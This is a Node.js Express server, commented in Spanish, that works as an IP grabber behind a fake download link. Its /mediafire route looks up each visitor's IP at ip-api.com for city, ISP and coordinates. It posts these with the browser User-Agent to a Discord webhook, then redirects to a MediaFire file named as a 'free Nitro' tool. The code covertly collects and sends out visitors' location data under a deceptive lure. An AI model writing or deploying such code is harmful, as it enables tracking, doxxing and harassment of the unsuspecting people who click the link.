// Importar los módulos necesarios
const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();
const port = 4000;

// Ruta para capturar la IP y redirigir a MediaFire
app.get('/mediafire', async (req, res) => {
    // Obtenemos la IP del visitante
    const visitorIp = req.ip.replace('::1', '127.0.0.1'); // Cambiar IPv6 a IPv4 para pruebas locales

    console.log("Visitor IP:", visitorIp); // Depurar IP

    // Llamamos a la API de ip-api para obtener más información sobre la IP
    try {
        const response = await axios.get(`http://ip-api.com/json/${visitorIp}`);
        const userInfo = response.data;

        console.log("API Response:", userInfo); // Depurar respuesta de la API

        // Crear el mensaje con la información del visitante
        const message = {
            content: `Nuevo acceso al archivo de MediaFire:\n` +
                     `IP: ${userInfo.query}\n` +
                     `Ubicación: ${userInfo.city}, ${userInfo.regionName}, ${userInfo.country}\n` +
                     `Organización/ISP: ${userInfo.org}\n` +
                     `Geolocalización: ${userInfo.lat}, ${userInfo.lon}\n` +
                     `User-Agent: ${req.headers['user-agent']}`
        };

        // Verificamos si la URL del webhook está definida
        if (!process.env.DISCORD_WEBHOOK_URL) {
            console.error("La URL del webhook de Discord no está definida.");
            return;
        }

        // Enviar la información al canal de Discord
        await axios.post(process.env.DISCORD_WEBHOOK_URL, message);

    } catch (err) {
        console.error('Error al obtener la información de la IP o al enviar datos al webhook:', err);
    }

    // Redirigir al usuario al enlace de MediaFire
    res.redirect('https://www.mediafire.com/file/tools_free-nitro');
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor corriendo en http://localhost:${port}`);
});
